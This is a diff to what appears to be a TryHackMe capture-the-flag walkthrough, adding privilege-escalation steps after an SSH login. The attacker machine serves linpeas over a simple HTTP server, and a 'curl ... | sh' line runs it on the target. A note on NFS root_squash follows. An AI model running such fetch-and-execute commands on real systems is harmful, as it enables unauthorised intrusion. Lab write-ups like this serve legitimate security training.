@@ -101,10 +101,17 @@ Now we can use our private id_rsa key to loginto SSH:
 
 Lets find out what we can execute and how we can escalate our privileges.
 
+First we create a simple http.server on our hostmachine:
 
+python3 -m http.server
 
+i already have linpeas if you need to downloaded it do it here: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 
+and on the target machine go into the /tmp directory:
 
+curl http://your_THM_IP/linpeas.sh | sh
+
+we found a option root_squash for nfs so we could try to ssh tunnel into that service.
 
 
 
